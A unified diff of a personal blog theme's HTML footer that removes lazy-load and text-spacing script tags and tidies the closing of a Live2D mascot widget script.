+        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
   <span class="with-love" id="animate">
     <i class="fa fa-heart"></i>
   </span>
@@ -1043,8 +1060,6 @@
 
 
 
-  
-
 
 
 
@@ -1073,9 +1088,6 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/fastclick@1/lib/fastclick.min.js"></script>
-
-  
-  <script src="//cdn.jsdelivr.net/npm/jquery-lazyload@1/jquery.lazyload.min.js"></script>
 
   
   <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
@@ -1519,11 +1531,6 @@
   
 
   
-  
-  
-  <script src="/lib/pangu/dist/pangu.min.js?v=3.3"></script>
-  <script>pangu.spacingPage();</script>
-
 
   
 
@@ -1663,6 +1670,5 @@
   <script>
   $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
   </script>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script>
-
-<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
+</html>
